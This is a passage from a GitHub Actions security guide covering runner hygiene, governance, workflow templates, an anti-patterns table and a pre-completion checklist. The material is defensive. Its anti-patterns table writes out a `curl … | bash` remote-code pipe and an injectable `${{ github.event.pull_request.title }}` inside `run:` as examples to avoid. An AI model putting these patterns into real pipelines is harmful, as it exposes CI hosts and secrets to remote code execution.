**Until this label is set, the policy does nothing.** Labeling-by-default is a good idea for prod clusters.

### Enforcement-point choice

| Point | Tool | Pros | Cons |
|-------|------|------|------|
| **CI gate** (pre-deploy step) | `gh attestation verify` | Fast, early feedback | Can be bypassed by a direct `kubectl apply` |
| **Registry admission / mutation** | Harbor policy, ECR scan-on-push | Catches unattested pushes | Registry-specific |
| **Cluster admission** | Sigstore policy-controller, Kyverno, OPA/Gatekeeper | Can't be bypassed | Requires cluster-wide rollout |

Layer them — CI gate for dev feedback, cluster admission for the blast-radius stop.

---

## SELF-HOSTED RUNNER HYGIENE

Self-hosted runners have the **largest** blast radius in GHA. A compromised workflow = host root on your infra.

### Rules

1. **Ephemeral only.** Use `--ephemeral` (or the `actions-runner-controller` / GitHub's autoscaling) so each job gets a fresh VM/container. Never reuse a runner across jobs.
2. **Never on public repos.** Public-repo PRs from anywhere can run arbitrary code on your runner. Enforce via org setting "Disable self-hosted runners for public repos" or runner-group ACLs.
3. **Runner groups** — scope each group to a specific set of repos. Never give one runner group access to the whole org.
4. **Network segmentation** — runners live in their own VPC/subnet, egress filtered. They do **not** sit on the same network as prod databases.
5. **No secrets on disk** — pass via `${{ secrets.* }}`; never bake cloud creds into the runner AMI.
6. **Patch the runner software** aggressively — `actions/runner` has had multiple CVEs.
7. **Audit `actions_runner` user permissions** — not root, restricted filesystem, no Docker socket unless the workloads need it and you trust them.
8. **Pin the runner image** — your autoscaler should build a known-good AMI/container, not pull `ghcr.io/...:latest`.

### When to choose GitHub-hosted vs self-hosted

| Use GitHub-hosted when | Use self-hosted when |
|-----------------------|----------------------|
| Default. Anything public. Anything where runner minutes < $500/mo. | You need GPUs, macOS ARM, >64 cores, >1.5 TB storage, VPC-internal network access, or deterministic IPs. |
| You don't want to operate runners. | You have the capacity to own patching + incident response for runner infra. |

---

## GOVERNANCE AT FLEET SCALE

### Required workflows (org-level)

**Settings → Actions → General → Required workflows** lets an org admin point to a workflow in a central repo that **must run and pass** on every PR to selected repos. Use this to enforce:

- The org's base CI (lint + test + SBOM scan).
- The SLSA build-provenance pipeline.
- Licensing / dependency-policy scans.

### Repository rulesets (governance, not workflows)

Rulesets (Settings → Rules) enforce things no workflow can:

- Require signed commits.
- Require specific status checks to pass.
- Restrict who can push / delete branches.
- Block deletions of default branch.
- Require deployment through an environment (no direct `gh api /repos/.../deployments`).
- **Require attestations** on packages pushed from this repo (when enabled, GHCR rejects non-attested pushes).

### CODEOWNERS & workflow reviews

`.github/CODEOWNERS`:

```
.github/workflows/*    @my-org/platform-eng
.github/actions/*      @my-org/platform-eng
Dockerfile             @my-org/platform-eng
```

Combined with a branch-protection rule requiring CODEOWNERS review, this prevents product engineers from silently rewriting the deploy pipeline.

### Dependabot for actions (again, because it matters)

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule: { interval: "weekly" }
    open-pull-requests-limit: 10
    groups:
      actions:
        patterns: ["*"]
```

Run `pinact --update` in a scheduled workflow as belt-and-suspenders.

---

## WORKFLOW TEMPLATES

### Base: PR CI (language-agnostic scaffold)

```yaml
name: ci

on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

permissions: {}

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

defaults:
  run:
    shell: bash

jobs:
  lint:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2
      # language-specific setup + lint

  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2
      # language-specific setup + test
```

### Container build + push + attest (release)

```yaml
name: release

on:
  push:
    tags: ['v*.*.*']

permissions: {}

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
      attestations: write
      packages: write
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2
      - uses: docker/setup-buildx-action@e468171a9de216ec08956ac3ada2f0791b6bd435 # v3.11.1
      - uses: docker/login-action@184bdaa0721073962dff0199f1fb9940f07167d1 # v3.5.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: push
        uses: docker/build-push-action@e468171a9de216ec08956ac3ada2f0791b6bd435 # v6.15.0
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: true
          tags: |
            ghcr.io/${{ github.repository }}:${{ github.ref_name }}
            ghcr.io/${{ github.repository }}:latest
          cache-from: type=gha
          cache-to: type=gha,mode=max
      - name: Attest image
        uses: actions/attest-build-provenance@977bb373ede98d70efbf0b7b13af9c3d6651dc60 # v4.1.0
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true
```

### Staged deploy (dev → staging → prod)

```yaml
name: deploy

on:
  workflow_run:
    workflows: [release]
    types: [completed]

permissions: {}

jobs:
  deploy-dev:
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-latest
    environment: development
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::111:role/dev-deploy
          aws-region: us-east-1
      - run: make deploy ENV=dev

  deploy-staging:
    needs: deploy-dev
    runs-on: ubuntu-latest
    environment: staging
    permissions: { id-token: write, contents: read }
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::222:role/staging-deploy
          aws-region: us-east-1
      - run: make deploy ENV=staging

  deploy-prod:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    permissions: { id-token: write, contents: read }
    steps:
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::333:role/prod-deploy
          aws-region: us-east-1
      - run: make deploy ENV=prod
```

---

## ANTI-PATTERNS

| Anti-pattern | Why wrong | Fix |
|--------------|-----------|-----|
| `uses: actions/checkout@v4` | Tag is mutable — supply-chain attack vector | Pin by SHA: `@08c6903c... # v4.2.2` |
| `permissions: write-all` | Grants every scope to every job; nukes least privilege | `permissions: {}` at top; grant per-job |
| Default `permissions:` (omitted) | Inherits org default, usually too broad | Always set explicitly |
| `run: echo "${{ github.event.pull_request.title }}"` | Script injection RCE | Bind via `env:` then `run: echo "$TITLE"` |
| `pull_request_target` + `actions/checkout` with PR ref + secrets in scope | Attacker code executes with write token | Split privileged / untrusted work; no secrets in untrusted job |
| Long-lived AWS key in `secrets.AWS_SECRET_ACCESS_KEY` | Key lifetime >> job lifetime → massive blast radius | OIDC federation with short-lived STS creds |
| `on: [push, pull_request]` with no branch filter | Every branch + every PR; duplicates CI runs | Filter `branches:` explicitly |
| No `concurrency:` | Rapid pushes queue unbounded runs → $$$ | Workflow-level concurrency group + cancel on PRs |
| `cancel-in-progress: true` on deploy jobs | Kills in-flight prod deploys | `false` for deploy, `true` for CI only |
| Secrets in `env:` at workflow level | Every job sees every secret | Environment secrets / job-level env with minimum values |
| `${{ secrets.TOKEN }}` in a `run:` directly | Works but masks + logs are fragile | `env: TOKEN: ${{ secrets.TOKEN }}` then `$TOKEN` |
| `curl https://some-url | bash` | Unpinned, unverified remote code | `curl` with checksum verification, or use a pinned action |
| Caching `node_modules` directly | Large, OS/arch-specific, breaks on minor version bumps | Cache the package-manager cache (`~/.npm`, `~/.yarn`, `~/.pnpm-store`) — or use `setup-node` with `cache: 'npm'` |
| Forgetting `secrets: inherit` / explicit pass in nested reusable workflows | Inner workflow sees no secrets → silent failure | `secrets: inherit` (coarse) or explicit map (preferred) |
| `fail-fast: true` on a test matrix | Loses diagnostics across configurations | `fail-fast: false` on test matrices; `true` on build/lint matrices where one failure = stop |
| Scheduled workflow every 5 minutes for "near-realtime" | GHA scheduler skews during congestion; DST skip | Use an external scheduler triggering `repository_dispatch` |
| Self-hosted runner on a public repo | Remote code execution by any fork | Disable self-hosted on public; runner groups scoped to private repos |
| No `environment:` on prod deploy | No approval gate, no scoped secrets | `environment: production` with required reviewers |
| No attestations on released artifacts | Supply-chain untrusted; SLSA L0 | `actions/attest-build-provenance` in release job |
| Cache key missing `runner.os` / lockfile hash | Cache hits across incompatible envs; stale deps | `${{ runner.os }}-npm-${{ hashFiles('package-lock.json') }}` |
| `actions/cache` without `restore-keys` | Cold miss rebuilds from scratch on any lockfile change | Provide prefix fallbacks |
| Hard-coded runner labels in every workflow | Runner migration requires touching N files | Centralize in a reusable workflow or `vars.RUNNER_LABEL` |

---

## AUTHORING QUICK REFERENCE

```yaml
# 1. Top of every workflow — prologue
name: ci
on: { ... }
permissions: {}                   # floor
concurrency: { group: ..., cancel-in-progress: ... }
defaults: { run: { shell: bash } }

# 2. Per job — widen permissions only as needed
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write              # if using OIDC or attestations
      attestations: write          # if attesting
      packages: write              # if pushing to GHCR
    environment: production        # if gated
    concurrency:                   # if you need per-job serialization
      group: ...
      cancel-in-progress: false
    steps:
      # 3. Every third-party action: SHA-pinned with tag comment
      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v4.2.2

      # 4. Any untrusted context → env: binding, NEVER inline ${{ }} in run:
      - run: echo "$TITLE"
        env:
          TITLE: ${{ github.event.pull_request.title }}

      # 5. Cache: runner.os + tool ver + lockfile hash + restore-keys fallback
      - uses: actions/cache@2f8e54208210a422b2efd51efaa6bd6d7ca8920f # v4.3.0
        with:
          path: ~/.cargo
          key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
          restore-keys: |
            ${{ runner.os }}-cargo-

      # 6. Release stages: build → push → attest
      - id: push
        uses: docker/build-push-action@e468171a9de216ec08956ac3ada2f0791b6bd435 # v6.15.0
        with: { push: true, tags: ghcr.io/${{ github.repository }}:${{ github.sha }} }
      - uses: actions/attest-build-provenance@977bb373ede98d70efbf0b7b13af9c3d6651dc60 # v4.1.0
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true
```

---

## VERIFICATION CHECKLIST (BEFORE DECLARING DONE)

Run through this list every time you finish a workflow. If any item fails, iterate.

### Security

- [ ] `permissions: {}` (or minimal read scopes) at workflow level; writes granted only per-job where needed.
- [ ] Every `uses:` for a third-party action is pinned by full commit SHA with tag comment.
- [ ] No `${{ github.event.*.title|body|message|name|email }}` or equivalent untrusted context appears inside a `run:` string — all such context flows through `env:`.
- [ ] `pull_request_target` workflows (if present) do not check out untrusted PR code alongside secrets.
- [ ] Cloud credentials via OIDC (`id-token: write` + cloud auth action), not long-lived access keys.
- [ ] OIDC trust-policy `sub` claim is scoped to `repo:<org>/<repo>:environment:<name>` or equivalent narrow claim.
- [ ] No secret appears in a workflow-level `env:` unless every job legitimately needs it.

### Robustness

- [ ] Workflow-level `concurrency:` with cancellation on PRs and **no** cancellation on deploys.
- [ ] Prod deploy jobs use `environment: production` with required reviewers + deployment-branch restrictions.
- [ ] Matrix jobs: `fail-fast: false` on test matrices; explicit `max-parallel` if cost matters.
- [ ] Reusable workflows pass secrets explicitly (not `inherit`) unless the broad surface is justified.

### Performance

- [ ] Dependency caching via `setup-*` with `cache:` input, or `actions/cache@v4` with `${{ runner.os }}` + lockfile hash in the key and `restore-keys` fallback.
- [ ] Cache keys on sensitive (release / prod-adjacent) jobs include `github.ref_name` to prevent PR cache poisoning.
- [ ] `actions/cache` key ≤ 512 chars.

### Supply chain

- [ ] Release jobs generate build-provenance attestations via `actions/attest-build-provenance` on every binary / container artifact.
- [ ] Container attestations use `push-to-registry: true`.
- [ ] Consumer / deploy side verifies with `gh attestation verify` (CI gate) or Sigstore policy-controller (K8s admission).
- [ ] Dependabot is enabled for `github-actions`.

### Observability

- [ ] Meaningful `name:` on every workflow, job, and non-trivial step.
- [ ] `echo "### Result summary" >> $GITHUB_STEP_SUMMARY` for jobs whose output matters.
- [ ] Grouped logs (`::group::`) for noisy steps.
- [ ] No secrets or untrusted input echoed to logs before `::add-mask::` where applicable.

### Governance

- [ ] `.github/CODEOWNERS` protects `.github/workflows/**` and `.github/actions/**`.
- [ ] Org-level required workflows (if applicable) enforce base CI + attestation pipeline.
- [ ] Ruleset in place for protected branches: signed commits, required checks, deployment environments.

### Ops

- [ ] Workflow runs in acceptable time (< 15 min for typical CI, < 60 min for release).
- [ ] No self-hosted runners used on public repos.
- [ ] Self-hosted runners (if any) are ephemeral and scoped by runner groups.
